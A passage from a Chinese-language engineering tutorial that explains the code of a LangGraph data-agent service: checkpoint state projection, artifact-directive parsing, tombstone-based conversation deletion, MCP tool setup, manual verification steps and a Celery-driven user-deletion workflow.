        # 只读投影必须合并这些值，才能与 CompiledGraph.aget_state() 保持一致。
        for _task_id, channel, value in saved.pending_writes or ():
            if channel in {ERROR, INTERRUPT}:
                # 控制通道描述任务状态，不属于业务 State channel values。
                continue
            _merge_pending_value(values, channel, value)
```

**`pending_writes` 是「节点已经产出但还没形成 Checkpoint 的结果」**。如果只读 `channel_values` 而不合并 pending writes，读到的状态会比实际执行的进度**旧一步**——表现为「Agent 已经回答了，但消息列表里看不到」。

**要跳过 `ERROR` 和 `INTERRUPT` 通道**——它们是控制通道，不是业务状态。

```python
def _merge_pending_value(
    values: dict[str, object],
    channel: str,
    value: object,
) -> None:
    """应用当前 Assistant 状态中实际使用的 reducer 语义。"""
    if channel == "messages":
        values[channel] = _messages_delta_reducer(
            cast(Any, values.get(channel)),
            [cast(Any, value)],
        )
    elif channel == "delegation_records":
        current = values.get(channel)
        values[channel] = {
            **(current if isinstance(current, Mapping) else {}),
            **(value if isinstance(value, Mapping) else {}),
        }
    else:
        values[channel] = value
```

**按通道应用不同的合并语义**——和图的 reducer 保持一致。`messages` 用 delta reducer，`delegation_records` 用浅合并，其余直接覆盖。

**情况三：从 branch trigger 恢复待执行节点**。

```python
def _next_nodes(checkpoint: Mapping[str, object]) -> tuple[str, ...]:
    """从尚未被目标节点消费的 branch trigger 恢复待执行节点。"""
    channel_values = checkpoint.get("channel_values")
    channel_versions = checkpoint.get("channel_versions")
    versions_seen = checkpoint.get("versions_seen")
    if not (
        isinstance(channel_values, Mapping)
        and isinstance(channel_versions, Mapping)
        and isinstance(versions_seen, Mapping)
    ):
        return ()

    nodes: list[str] = []
    for channel in channel_values:
        if not isinstance(channel, str) or not channel.startswith("branch:to:"):
            continue
        node = channel.removeprefix("branch:to:")
        seen = versions_seen.get(node)
        # 目标节点记录的已见版本落后于 trigger 版本时，该分支仍等待执行。
        if not isinstance(seen, Mapping) or seen.get(channel) != channel_versions.get(
            channel
        ):
            nodes.append(node)
    return tuple(sorted(nodes))
```

**这是判断「能不能恢复」的依据**（`can_resume_agent_turn` 用 `state.next_nodes`）。

LangGraph 的图执行用 `branch:to:<node>` 通道传递「该去哪个节点」的信号。如果目标节点记录的已见版本**落后于**通道当前版本，说明这个信号还没被消费——也就是「这个节点还等着执行」。

**这段逻辑直接操作 LangGraph 的内部数据结构**，属于比较脆弱的部分。LangGraph 内部结构变化时这里要跟着改。

### 9.3.11 消息投影与产物指令

`app/assistant/services/message_projection.py` 把 LangChain 消息转成接口消息。几个关键函数：

**`normalize_finish_reason`**：

```python
def normalize_finish_reason(value: object) -> str | None:
    """还原流式消息元数据中被重复拼接的已知结束原因。

    LangChain 合并流式 Chunk 时会拼接重复出现的字符串元数据，例如两个
    ``stop`` 可能变成 ``stopstop``。未知供应商值保持原样，避免掩盖新状态。
    """
    if not isinstance(value, str):
        return None
    for reason in _KNOWN_FINISH_REASONS:
        repeat_count, remainder = divmod(len(value), len(reason))
        if repeat_count > 1 and remainder == 0 and value == reason * repeat_count:
            return reason
    return value
```

**这个 bug 值得单独讲**。LangChain 合并流式 chunk 时，对字符串类型的元数据用的是「拼接」而不是「取最后一个」。如果两个 chunk 都带 `finish_reason="stop"`，合并后变成 `"stopstop"`。

**处理方式**：检查字符串是不是某个已知原因的整数倍重复，是就还原。

**关键在最后一行 `return value`**——**未知值保持原样**。注释说明了原因：「避免掩盖新状态」。如果强行归一化成一个已知值，供应商新增的 `finish_reason`（比如 `content_filter` 之外的新状态）就被掩盖了。

```python
_KNOWN_FINISH_REASONS = (
    "content_filter",
    "function_call",
    "tool_calls",
    "length",
    "stop",
)
```

**产物交付指令的解析**：

```python
_ARTIFACT_DIRECTIVE_PATTERN = re.compile(
    r"^[ ]{0,3}\[\[DATAAGENT_ARTIFACT:(/[^\r\n]+?)\]\][\t ]*$"
)
_MARKDOWN_FENCE_PATTERN = re.compile(r"^[ ]{0,3}(?P<marker>`{3,}|~{3,})")
```

**这是一个纯文本指令**，Planner 的提示词里要求模型这样交付文件：

> 向用户交付可直接查看或下载的文件时，必须把 artifact 中的完整绝对路径原样放入独占一行的 `[[DATAAGENT_ARTIFACT:<absolute_path>]]` 纯文本交付指令。

**为什么用纯文本指令而不是工具调用**：因为最终交付发生在模型的最后一条消息里，那时模型已经不再调用工具了。用一个「独占一行的标记」让服务端能识别并提取。

**正则的两个约束**：

- `^[ ]{0,3}` 和 `[\t ]*$`：允许最多 3 个前导空格和尾部空白（Markdown 渲染时可能被加缩进）。
- `(/[^\r\n]+?)`：路径必须以 `/` 开头（绝对路径），非贪婪匹配到 `]]`。

**解析时要跳过代码块**：

```python
def _transform_artifact_directives(
    text: str,
    removable_paths: set[str] | None = None,
) -> tuple[str, list[str]]:
    """查找非代码块独占行指令，并按需移除已验证指令。"""
    paths: list[str] = []
    output: list[str] = []
    fence_character: str | None = None
    fence_length = 0

    for line in text.splitlines(keepends=True):
        content = line.rstrip("\r\n")
        fence_match = _MARKDOWN_FENCE_PATTERN.match(content)
        if fence_character is None:
            if fence_match is not None:
                marker = fence_match.group("marker")
                fence_character = marker[0]
                fence_length = len(marker)
                output.append(line)
                continue
        elif fence_match is not None:
            marker = fence_match.group("marker")
            suffix = content[fence_match.end() :]
            if (
                marker[0] == fence_character
                and len(marker) >= fence_length
                and not suffix.strip()
            ):
                fence_character = None
                fence_length = 0
            output.append(line)
            continue

        if fence_character is None:
            directive_match = _ARTIFACT_DIRECTIVE_PATTERN.fullmatch(content)
            if directive_match is not None:
                path = directive_match.group(1)
                paths.append(path)
                if removable_paths is not None and path in removable_paths:
                    continue
        output.append(line)

    return "".join(output), paths
```

**为什么要跟踪代码围栏**：模型可能在解释指令语法时把它写在代码块里（比如「使用 ` ``` ` 包裹的 `[[DATAAGENT_ARTIFACT:...]]` 」）。**代码块里的不算真实指令**。

围栏匹配要处理：
- 反引号（`` ``` ``）和波浪线（`~~~`）两种；
- 开围栏的字符类型和长度要记下来，闭围栏必须**同类型且不短于**开围栏；
- 闭围栏后不能有非空内容。

**验证后才转成附件**：

```python
async def _project_final_artifact_directives(
    message: BaseMessage,
    schema: chat_schema.MessageResponse,
    files: ConversationFileInspector,
    user_id: int,
    conversation_id: UUID,
) -> chat_schema.MessageResponse:
    """把 Planner 最终消息中的有效文件指令投影为附件。"""
    if not _is_final_assistant_message(message):
        return schema

    candidate_paths: list[str] = []
    for part in schema.parts:
        if isinstance(part, chat_schema.TextContent):
            _, paths = _transform_artifact_directives(part.text)
            candidate_paths.extend(paths)
    if not candidate_paths:
        return schema

    accepted_paths: set[str] = set()
    attachments: list[chat_schema.Attachment] = []
    seen_paths: set[str] = set()
    for directive_path in candidate_paths:
        try:
            relative_path = _normalized_directive_path(
                directive_path,
                conversation_id,
            )
        except SandboxPathError:
            logger.warning(
                "最终产物指令路径无效: "
                f"conversation_id={conversation_id}, path={directive_path!r}"
            )
            continue
```

**只有「最终助手消息」才处理产物指令**：

```python
def _is_final_assistant_message(message: BaseMessage) -> bool:
    """判断消息是否可以承载 Planner 最终产物指令。"""
    if not isinstance(message, AIMessage) or message.tool_calls:
        return False
    finish_reason = normalize_finish_reason(
        message.response_metadata.get("finish_reason")
    )
    return finish_reason in {None, "stop"}
```

两个条件：**没有工具调用**（有工具调用说明还要继续干活）+ **结束原因是 stop**（不是 length 截断）。

**路径必须归一化到 Conversation 相对路径，且必须在 `sessions/` 下**：

```python
def _normalized_directive_path(path: str, conversation_id: UUID) -> str:
    """将最终产物指令路径规范化为 Conversation 内相对路径。"""
    normalized = conversation_relative_path(path, conversation_id)
    if not normalized.startswith("sessions/"):
        raise SandboxPathError(path)
    return normalized
```

**`sessions/` 的限制很重要**——防止模型把 `uploads/` 下的用户上传文件当成自己的产物交付回来。

**去重与验证**：同一路径出现两次时直接接受（`accepted_paths.add` 但不重复加附件），首次出现时要 `is_downloadable_file` 验证。

**清理已接受的指令文本**：

```python
    parts: list[chat_schema.MessagePart] = []
    for part in schema.parts:
        if not isinstance(part, chat_schema.TextContent):
            parts.append(part)
            continue
        cleaned, _ = _transform_artifact_directives(part.text, accepted_paths)
        if cleaned:
            parts.append(part.model_copy(update={"text": cleaned}))
    return schema.model_copy(
        update={
            "parts": parts,
            "attachments": attachments or None,
        }
    )
```

**把已识别的指令从正文里删掉**（`removable_paths=accepted_paths`），因为它们已经变成附件卡片了。**未识别的指令保留在正文里**——用户能看到模型想交付什么（即使文件不存在）。

### 9.3.12 会话生命周期与删除

`ConversationLifecycleService` 管会话的删除与清理。

**锁**：

```python
    @asynccontextmanager
    async def lock(
        self,
        user_id: int,
        conversation_id: UUID,
    ) -> AsyncGenerator[None]:
        """获取跨进程会话生命周期锁。"""
        async with self._lock_provider.advisory_lock(
            conversation_lifecycle_lock_name(user_id, conversation_id),
        ):
            yield
```

用的是**同一个锁名**（`conversation:{thread_id}`）——和 `AgentManager.execution` 里的 `runtime.planner_lock()` 是同一把。这样「跑 Agent」和「删会话」互斥。

**受理删除（写墓碑）**：

```python
    async def request_conversation_deletion(
        self,
        user_id: int,
        conversation_id: UUID,
        *,
        draft_only: bool = False,
    ) -> bool:
        """写入删除墓碑并使会话立即从接口中消失。"""
        await self._agents.cancel_agent_execution(user_id, conversation_id)
        try:
            async with (
                self.lock(user_id, conversation_id),
                self._repository_factory() as repository,
            ):
                conversation = await repository.get(
                    user_id,
                    conversation_id,
                    include_deleting=True,
                )
                if conversation is None:
                    return False
                if draft_only and not conversation.is_draft:
                    return False
                if conversation.deletion_requested_at is None:
                    await repository.update(
                        conversation,
                        deletion_requested_at=datetime.now(UTC),
                    )
                return True
        except AdvisoryLockBusyError as exc:
            raise ConversationLifecycleBusyError(
                "会话正在由其他执行单元运行或清理"
            ) from exc
```

**先取消执行**（`cancel_agent_execution`），**再拿锁**。顺序很重要：如果先拿锁再取消，可能死等（执行任务持着锁在跑）。先取消让任务释放锁，再拿锁就很短。

**用「删除墓碑」而不是立即删除**：

- 写一个 `deletion_requested_at` 时间戳，会话立即从列表接口消失（查询时会过滤）。
- 物理删除由 Celery 任务做。

**为什么**：物理删除要清 Checkpoint、召回快照、沙箱目录，可能几秒到几十秒。让 HTTP 请求等这么久不好。而「会话立即消失」对用户来说就是删除完成了。

**`draft_only` 参数**：只允许删草稿。防止前端传错 ID 把正式会话删了。

**幂等**：`if conversation.deletion_requested_at is None` 才写——重复请求不改变时间戳。

**物理删除**：

```python
    async def delete_conversation_resources(
        self,
        user_id: int,
        conversation_id: UUID,
        *,
        draft_expired_before: datetime | None = None,
        draft_only: bool = False,
    ) -> bool:
        """幂等删除一个会话的全部跨存储资源。"""
        async with self.lock(user_id, conversation_id):
            async with self._repository_factory() as repository:
                conversation = await repository.get(
                    user_id,
                    conversation_id,
                    include_deleting=True,
                )
            if conversation is None:
                return False
            if draft_only and not conversation.is_draft:
                return False
            if draft_expired_before is not None and (
                not conversation.is_draft
                or conversation.update_at > draft_expired_before
            ):
                return False

            await self._agents.delete_agent_under_lifecycle_lock(
                user_id,
                conversation_id,
            )
            async with self._recall_cleaner_factory() as recall_cleaner:
                await recall_cleaner.delete_all(user_id, conversation_id)
            await self._sandbox.delete_conversation(user_id, conversation_id)
            async with self._repository_factory() as repository:
                await repository.delete(user_id, conversation_id)
            return True
```

**删除顺序是固定的**：

```
1. Agent 状态（Checkpoint + 墓碑 + 运行时）
2. 召回快照
3. 沙箱目录
4. 会话记录（最后）
```

**为什么最后删会话记录**：因为前面的步骤需要 `conversation_id` 来定位资源。如果先删了记录，中途失败后就无法重试（不知道要删什么了）。

**`draft_expired_before` 的二次确认**：定时任务扫描出的「过期草稿」，在真正删除前再确认一次「它仍然是草稿，且更新时间仍在过期时间之前」。因为从扫描到删除之间，用户可能又用了这个草稿（发了消息），那就不是过期草稿了。

**按用户批量删**：

```python
    async def delete_user_conversations(self, user_id: int) -> None:
        """删除用户全部会话及残留召回记录。"""
        while True:
            async with self._repository_factory() as repository:
                conversations = await repository.list_all_by_user(
                    user_id,
                    include_deleting=True,
                )
            if not conversations:
                break
            for conversation in conversations:
                await self.delete_conversation_resources(user_id, conversation.id)
        await self._agents.delete_user_agents(user_id)
        async with self._recall_cleaner_factory() as recall_cleaner:
            await recall_cleaner.delete_all_by_user(user_id)
```

**外层 `while True` 循环直到查不到会话**。因为删除过程中可能有新会话被创建（虽然用户已被禁用，理论上不会），循环保证清干净。

**批量任务的两个入口**：

```python
    async def cleanup_expired_drafts(self) -> int:
        """执行一批过期草稿回收。"""
        cutoff = datetime.now(UTC) - timedelta(minutes=self._config.draft_ttl_minutes)
        async with self._repository_factory() as repository:
            drafts = await repository.list_expired_drafts(
                cutoff,
                limit=self._config.cleanup_batch_size,
            )
        deleted = 0
        for draft in drafts:
            if await self.delete_conversation_resources(
                draft.user_id,
                draft.id,
                draft_expired_before=cutoff,
            ):
                deleted += 1
        return deleted

    async def cleanup_pending_deletions(self) -> int:
        """执行一批已有删除墓碑的物理资源清理。"""
        async with self._repository_factory() as repository:
            conversations = await repository.list_pending_deletions(
                limit=self._config.cleanup_batch_size
            )
        deleted = 0
        for conversation in conversations:
            if await self.delete_conversation_resources(
                conversation.user_id,
                conversation.id,
            ):
                deleted += 1
        return deleted
```

| 方法 | 处理什么 | 触发 |
| --- | --- | --- |
| `cleanup_expired_drafts` | 长期未用的草稿（`draft_ttl_minutes` 默认 1440 = 24 小时） | Beat 每 300 秒 |
| `cleanup_pending_deletions` | 已写墓碑但物理资源还没清的会话 | Beat 每 300 秒 |

**第二个方法是「补偿」**——用户点删除时如果 Celery 任务提交失败，墓碑已经写了但资源没清。这个定时任务会捡起来。

**注意它是「一批一批」而不是「全部」**（`limit=cleanup_batch_size`，默认 100）。因为一次清太多会让单次任务超时。

### 9.3.13 MCP 工具

```python
def _connection_config(mcp_cfg: MCPCfg) -> Connection:
    """在 MCP 客户端边界解包连接凭据。"""
    connection = mcp_cfg.model_dump(exclude_none=True)
    url = connection.get("url")
    if isinstance(url, SecretStr):
        connection["url"] = url.get_secret_value()
    for field_name in ("headers", "env"):
        values = connection.get(field_name)
        if isinstance(values, dict):
            connection[field_name] = {
                name: value.get_secret_value()
                if isinstance(value, SecretStr)
                else value
                for name, value in values.items()
            }
    return cast(Connection, connection)


async def get_mcp_tools() -> list[BaseTool]:
    """初始化 MCP 客户端并返回所有 MCP 工具。"""
    connections: dict[str, Connection] = {
        name: _connection_config(mcp_cfg)
        for name, mcp_cfg in app_config.cfg.mcp.items()
    }
    client = MultiServerMCPClient(connections)
    return await client.get_tools()
```

**`SecretStr` 在边界解包**。配置里 URL 和 header 里的密钥都是 `SecretStr`（防止日志泄漏），但 MCP 客户端需要明文。所以**在传给客户端的最后一刻**才 `get_secret_value()`。

**注意 `exclude_none=True`**——MCP 客户端不接受 `None` 值的字段，所以先过滤掉。

**MCP 工具的命名冲突检查在 `specialists.py`**：

```python
_RESERVED_MCP_TOOL_NAMES = frozenset(
    {
        "delegation",
        "task",
        "eval",
        "ls",
        "read_file",
        "write_file",
        "edit_file",
        "delete",
        "glob",
        "grep",
        "shell",
        "list_shell_jobs",
        "get_shell_job",
        "cancel_shell_job",
        "view_image",
    }
)
```

```python
    mcp_tool_names = frozenset(tool.name for tool in mcp_tools)
    reserved_mcp_names = sorted(mcp_tool_names & _RESERVED_MCP_TOOL_NAMES)
    if reserved_mcp_names:
        raise ValueError(
            f"MCP 工具名称与运行时内置工具冲突: {', '.join(reserved_mcp_names)}"
        )
```

**在启动时就检查冲突并报错**。因为如果 MCP 工具叫 `shell`，它会覆盖内置的 shell 工具——模型的 `shell` 调用会走到 MCP 而不是沙箱，行为完全错乱。这种问题在运行时才发现会很难排查。

**Explorer 必需工具的检查**：

```python
_REQUIRED_EXPLORER_TOOLS = frozenset({"recall_context", "execute_sql"})
```

```python
    missing_tools = sorted(_REQUIRED_EXPLORER_TOOLS - tools_by_name.keys())
    if missing_tools:
        raise ValueError(f"Explorer 缺少必需工具: {', '.join(missing_tools)}")
```

**启动时确保 Explorer 拿到了数据访问工具**。如果漏了，Explorer 就没法干活——但报错会是「模型不知道怎么查数据」，很难定位。所以提前检查。

**内置工具之间的重名也检查**：

```python
    tools_by_name: dict[str, BaseTool] = {}
    for tool in (*builtin_tools, *mcp_tools):
        if tool.name in tools_by_name:
            raise ValueError(f"存在重名工具: {tool.name}")
        tools_by_name[tool.name] = tool
```

## 9.4 测试

**没有单元测试目录**。这个模块几乎无法脱离完整环境测试（需要模型 API、Docker、PG、Redis）。

### 9.4.1 端到端验证：一次完整对话

```bash
# 前置：四个进程都在跑
make start
```

登录前端，新建对话，问：

```
最近 30 天的 GMV 是多少？
```

**预期的 SSE 事件序列**（浏览器 DevTools → Network → 选中 `stream` 请求 → EventStream 标签）：

```
data: {"type":"thinking","message_id":"...","delta":"用户想查...","reset":true}
data: {"type":"message_delta","message_id":"...","delta":"我来","reset":true}
data: {"type":"message","message":{...}}
data: {"type":"subagent_status","delegation_id":"...","status":"running",...}
data: {"type":"subagent_thinking",...}
data: {"type":"subagent_message",...}
data: {"type":"subagent_status","delegation_id":"...","status":"completed",...}
...
data: {"type":"done"}
```

**关注三点**：

1. **`reset: true` 只出现在每个 message_id 的第一次**。如果每个 delta 都带 `reset: true`，前端会只显示最后一个 token。
2. **`message_id` 在同一段回答里保持不变**。如果每个 delta 的 id 不同，说明 `DataAgentResponses` 的 ID 统一没生效。
3. **`done` 事件必须出现**。没有它前端会一直转圈。

### 9.4.2 验证断线续传

1. 发起一个复杂问题（会跑几分钟的多 Agent 任务）。
2. **任务跑到一半时刷新页面**。
3. 观察：页面重新加载后，应该**先快速回放已完成的事件**（从 replay 缓存），再继续接收实时事件。

如果刷新后是空白、不显示任何历史，说明 replay 机制有问题。

### 9.4.3 验证停止

任务跑到一半点「停止」按钮。预期：

- 前端立即停止更新；
- 后端日志出现 `智能体执行已停止: conversation_id=...`；
- `query_executions` 表里能看到已完成的查询记录（停止不会回滚已完成的步骤）；
- 会话的 `running` 状态变成 `false`。

### 9.4.4 验证恢复

如果 Agent 因为某种原因中断（比如模型 API 超时），前端会显示「继续」按钮。点它预期：

- 后端日志出现 `智能体回合恢复: conversation_id=...`；
- Agent 从中断的节点继续，而不是从头开始。

**可以手工构造这个场景**：任务跑到一半时停掉 Worker（如果任务在 Worker 里）或者直接停后端进程，再重启。

### 9.4.5 验证会话删除

删除一个会话后检查：

```bash
# 会话记录还在（墓碑）
docker exec -it postgres psql -U atguigu -d langgraph -c \
  "SELECT id, title, deletion_requested_at FROM conversations WHERE deletion_requested_at IS NOT NULL LIMIT 5;"

# 等 Beat 跑一轮（默认 300 秒）后，记录应该消失
docker exec -it postgres psql -U atguigu -d langgraph -c \
  "SELECT count(*) FROM conversations;"
```

**关键验证点**：删除请求返回 204 后，**会话立即从 `/api/v1/chat/ls` 列表里消失**（墓碑生效），但数据库记录还在（等物理删除）。

### 9.4.6 验证子 Agent 活动读取

一次多 Agent 分析跑完后，从数据库直接读一次委派的历史：

```bash
docker exec -it postgres psql -U atguigu -d langgraph -c \
  "SELECT DISTINCT checkpoint_ns FROM checkpoints WHERE checkpoint_ns LIKE 'subagents/%' LIMIT 10;"
```

预期：能看到形如 `subagents/<analysis_id>/<agent_type>/<session_id>` 的 namespace 列表。

**验证 namespace 的三段结构**：

```bash
docker exec -it postgres psql -U atguigu -d langgraph -c \
  "SELECT checkpoint_ns, count(*) FROM checkpoints
   WHERE checkpoint_ns LIKE 'subagents/%'
   GROUP BY checkpoint_ns ORDER BY count(*) DESC LIMIT 10;"
```

每个 namespace 的 Checkpoint 数量反映该 Session 执行的步数。explorer 的通常最多（要查数），reviewer 的次之。

### 9.4.7 验证产物交付

问一个明确要求交付文件的问题，比如「把 orders 表最近一周的数据导出来」。

预期：回答里出现附件卡片。在浏览器 Network 面板看 `/api/v1/chat/ls/{id}` 的响应，`attachments` 数组里应该有一项，`f_path` 形如 `sessions/<analysis_id>/explorer/<session_id>/xxx_abc12345.csv`。

**如果正文里还留着 `[[DATAAGENT_ARTIFACT:...]]` 文本**，说明指令识别失败——检查路径是不是以 `/` 开头、是不是独占一行、有没有被包在代码块里。

---

# 10. 跨存储工作流（workflows）

## 10.1 需求说明

这个模块只有一个业务：**用户注销**。但它值得单独一章，因为它演示了「跨多个存储的编排」应该怎么写。

**问题**：注销一个用户要动五个地方。

```
auth 库      users / refresh_tokens / user_deletion_tasks
assistant 库  conversations / 删除墓碑 / LangGraph Checkpoint
meta 库       召回快照
Doris         （用户的查询身份对应的角色不由注销删除，角色是共享的）
Docker        用户沙箱容器 + 数据卷
```

同步做会超时；异步做要保证「不丢、不重、失败可重试」。

**输入输出**：

| 能力 | 输入 | 输出 |
| --- | --- | --- |
| 受理注销 | user_id + operator_id | bool（是否新受理） |
| 执行清理 | user_id | 无（幂等） |
| 定时补投 | — | 本次投递数量 |

**关键约束**：

- 不能注销自己；
- 不能注销最后一个管理员；
- 受理即生效（用户立刻登不上），但物理清理异步；
- 失败要能重试，且重试不会重复清理。

## 10.2 代码组织规划

```
app/workflows/
├── contracts.py       两个 Protocol（UserDeletionStateStore / UserSandboxCleaner）
├── user_deletion.py   UserDeletionService（82 行，纯编排）
└── tasks.py           Celery 任务（158 行）
```

**就三个文件**。核心设计是「用 Protocol 把依赖隔离出去」。

```python
class UserDeletionStateStore(Protocol):
    """用户注销编排所需的认证状态存储能力。"""

    async def request(self, user_id: int, requested_at: datetime) -> bool:
        """禁用用户、吊销令牌并创建注销任务。"""
        ...

    async def is_completed(self, user_id: int) -> bool:
        """判断用户注销任务是否完成。"""
        ...

    async def complete(self, user_id: int, completed_at: datetime) -> None:
        """删除认证用户并完成注销任务。"""
        ...

    async def record_failure(
        self,
        user_id: int,
        *,
        error: str,
        next_attempt_at: datetime,
    ) -> None:
        """记录注销失败并安排重试。"""
        ...


class UserSandboxCleaner(Protocol):
    """用户注销所需的沙箱清理能力。"""

    async def delete_user_sandbox(self, user_id: int) -> None:
        """删除用户全部沙箱资源。"""
        ...
```

**为什么用 Protocol**：

- `workflows` 模块**不 import `identity` 和 `sandbox` 的任何实现**。它只知道「有个东西能给我这几个方法」。
- 同一段编排逻辑，在 API 进程里注入的是 `PostgresUserDeletionStateStore` + `DockerSandboxManager`，在 Worker 进程里注入的是新构造的实例。**依赖注入的时机不同，编排代码完全不变**。
- 测试时可以注入假实现。

`ConversationLifecycleService` 是**直接依赖具体类**的（不是 Protocol）：

```python
    def __init__(
        self,
        state_store: UserDeletionStateStore,
        sandbox: UserSandboxCleaner,
        conversations: ConversationLifecycleService,
        config: LifecycleConfig,
    ) -> None:
        """绑定用户注销涉及的各存储和生命周期服务。"""
```

**这里有一个不对称，值得注意**：`state_store` 和 `sandbox` 用 Protocol，`conversations` 用具体类。

为什么？因为 `ConversationLifecycleService` 本身就是「编排多个存储」的服务，它已经是抽象层了；而 `PostgresUserDeletionStateStore` 和 `DockerSandboxManager` 是具体实现。**只为「跨模块的实现」定义 Protocol，不为「已经足够抽象的编排服务」再包一层**。

## 10.3 具体实现

### 10.3.1 编排服务

```python
class UserDeletionService:
    """协调认证库、会话库、元数据库、索引和沙箱的用户注销。"""

    def __init__(
        self,
        state_store: UserDeletionStateStore,
        sandbox: UserSandboxCleaner,
        conversations: ConversationLifecycleService,
        config: LifecycleConfig,
    ) -> None:
        """绑定用户注销涉及的各存储和生命周期服务。"""
        self._state_store = state_store
        self._sandbox = sandbox
        self._conversations = conversations
        self._config = config

    async def request_deletion(self, user_id: int, *, operator_id: int) -> bool:
        """禁用目标用户并持久化注销任务。"""
        if user_id == operator_id:
            raise auth_error.InvalidUserMutationError(
                detail="不能注销当前操作的管理员账号"
            )

        submitted = await self._state_store.request(user_id, datetime.now(UTC))
        if submitted:
            logger.info(f"用户注销已受理: operator_id={operator_id}, user_id={user_id}")
        return submitted
```

**整个 `request_deletion` 只有 8 行**。所有实际工作都委托出去了：

- 「不能注销自己」放在这里（业务规则）；
- 「不能注销最后一个管理员」放在 `state_store.request` 里（需要查数据库）；
- 禁用、吊销令牌、建任务都在 `state_store.request` 的**一个事务**里。

**为什么「不能注销自己」在这里而不是 store 里**：因为它需要 `operator_id`，而 store 的接口只有 `user_id`。把「操作者」这个信息留在编排层是对的——store 不应该知道「谁在操作」。

### 10.3.2 幂等执行

```python
    async def process(self, user_id: int) -> None:
        """幂等执行一个用户的跨存储注销清理。"""
        if await self._state_store.is_completed(user_id):
            logger.info(f"用户注销清理已完成，跳过重复任务: user_id={user_id}")
            return
        logger.info(f"开始用户注销清理编排: user_id={user_id}")
        try:
            await self._conversations.delete_user_conversations(user_id)
            logger.info(f"用户会话资源清理完成: user_id={user_id}")
            await self._sandbox.delete_user_sandbox(user_id)
            logger.info(f"用户沙箱资源清理完成: user_id={user_id}")
            await self._state_store.complete(user_id, datetime.now(UTC))
            logger.info(f"用户注销清理编排完成: user_id={user_id}")
        except Exception as exc:
            await self._record_failure(user_id, exc)
            logger.exception(
                "用户注销清理编排失败: "
                f"user_id={user_id}, error_type={type(exc).__name__}"
            )
            raise
```

**三个步骤，严格顺序**：

```
1. delete_user_conversations   清所有会话（连带 Checkpoint、召回快照、沙箱会话目录）
2. delete_user_sandbox         清用户容器 + 数据卷
3. complete                    删 users 表记录 + 标记任务完成
```

**每一步前面都有日志**。这是有意的——注销失败时，从日志能看出卡在哪一步。因为这三步涉及三个不同的存储，失败原因完全不同。

**幂等靠 `is_completed` 短路**。如果任务被重复投递（Celery 的 at-least-once 语义 + Beat 的定时补投），第二次执行会直接返回。

**失败处理**：

```python
    async def _record_failure(self, user_id: int, exc: Exception) -> None:
        """记录注销失败原因和下一次重试时间。"""
        now = datetime.now(UTC)
        next_attempt_at = now + timedelta(
            seconds=self._config.user_deletion_retry_seconds
        )
        await self._state_store.record_failure(
            user_id,
            error=f"{type(exc).__name__}: {exc}",
            next_attempt_at=next_attempt_at,
        )
        logger.warning(
            "用户注销失败状态已记录: "
            f"user_id={user_id}, error_type={type(exc).__name__}, "
            f"next_attempt_at={next_attempt_at.isoformat()}"
        )
```

**记录失败后仍然 `raise`**（在 `process` 里）。这样有两套重试机制：

| 机制 | 触发 | 间隔 |
| --- | --- | --- |
| Celery `autoretry_for` | 任务抛异常 | 指数退避（1s、2s、4s），最多 3 次 |
| Beat 定时补投 | `next_attempt_at` 到期 | 60 秒（`user_deletion_retry_seconds`） |

**为什么两套都要**：Celery 重试是「快速重试」（适合瞬时故障，比如网络抖动）；Beat 补投是「持久兜底」（适合长时间故障，比如目标数据库不可用）。只有 Celery 重试的话，3 次失败后任务就永久放弃了。

**错误信息用 `{type}: {message}` 格式**。这样从 `last_error` 字段能看出异常类型，便于分类统计。

### 10.3.3 Celery 任务的资源自管理

```python
async def _process_user_deletion(user_id: int) -> None:
    """初始化跨存储资源并处理单个用户注销任务。"""
    auth_postgres = PostgresClientManager(cfg.auth_postgresql, AuthBase)
    assistant_postgres = PostgresClientManager(
        cfg.langgraph_postgresql,
        AssistantBase,
    )
    meta_postgres = PostgresClientManager(
        cfg.meta_postgresql,
        MetaBase,
    )
    persistence = LangGraphPostgresManager(cfg.langgraph_postgresql)
    sandbox = create_sandbox_manager(
        cfg.sandbox,
        packaged_skill_readonly_mounts(),
    )
    agents = AgentManager(
        persistence,
        sandbox,
        ConversationTombstoneStore(assistant_postgres),
    )
    conversations = build_conversation_lifecycle_service(
        persistence,
        assistant_postgres,
        meta_postgres,
        agents,
        sandbox,
        cfg.lifecycle,
    )
    state_store = PostgresUserDeletionStateStore(auth_postgres)
    service = UserDeletionService(
        state_store,
        sandbox,
        conversations,
        cfg.lifecycle,
    )

    auth_postgres.init()
    assistant_postgres.init()
    meta_postgres.init()
    await persistence.init()
    await sandbox.init(start_cleanup=False)
    try:
        started_at = datetime.now(UTC)
        await state_store.extend_claim(
            user_id,
            lease_until=started_at + timedelta(seconds=TASK_VISIBILITY_TIMEOUT_SECONDS),
        )
        await service.process(user_id)
    finally:
        await agents.close()
        await sandbox.disconnect()
        await persistence.close()
        await meta_postgres.close()
        await assistant_postgres.close()
        await auth_postgres.close()
```

**这个函数是「Worker 侧的组装入口」**，和 `app/providers.py`（API 侧的组装入口）形成对称：

| 侧 | 组装入口 | 资源生命周期 |
| --- | --- | --- |
| API | `app/providers.py`（模块级单例） | 进程启动到关闭 |
| Worker | `_process_user_deletion`（函数内局部） | 单次任务 |

**为什么 Worker 侧不用全局单例**：Celery Worker 是长驻进程，但它可能同时跑多个任务（取决于并发配置）。用全局单例的话，多个任务会共享连接池和沙箱管理器——沙箱管理器的清理循环、所有权租约都会互相干扰。

**`sandbox.init(start_cleanup=False)`** 再次出现——Worker 不跑空闲清理循环。

**`extend_claim` 在真正开始干活前延长租约**：

```python
        started_at = datetime.now(UTC)
        await state_store.extend_claim(
            user_id,
            lease_until=started_at + timedelta(seconds=TASK_VISIBILITY_TIMEOUT_SECONDS),
        )
        await service.process(user_id)
```

**为什么**：Beat 领取任务时设了租约（`next_attempt_at = claimed_at + TASK_VISIBILITY_TIMEOUT_SECONDS`）。但从「投递任务」到「Worker 真正开始执行」可能隔了一段时间（队列积压）。如果这段时间超过了租约，Beat 会认为任务失败了并重新投递——两个 Worker 同时清理同一个用户。

所以在**开始干活前重新延长租约**，把「排队等待时间」排除在外。

**资源释放顺序是初始化的逆序**：

```python
    finally:
        await agents.close()
        await sandbox.disconnect()
        await persistence.close()
        await meta_postgres.close()
        await assistant_postgres.close()
        await auth_postgres.close()
```

`agents.close()` 排在最前——它会取消正在跑的 Agent 任务并清理 Shell Job。必须先停这些，再关它们依赖的沙箱和 Checkpoint。

### 10.3.4 定时补投

```python
async def _dispatch_due_user_deletions() -> int:
    """原子领取到期注销记录并向生命周期队列提交任务。"""
    auth_postgres = PostgresClientManager(cfg.auth_postgresql, AuthBase)
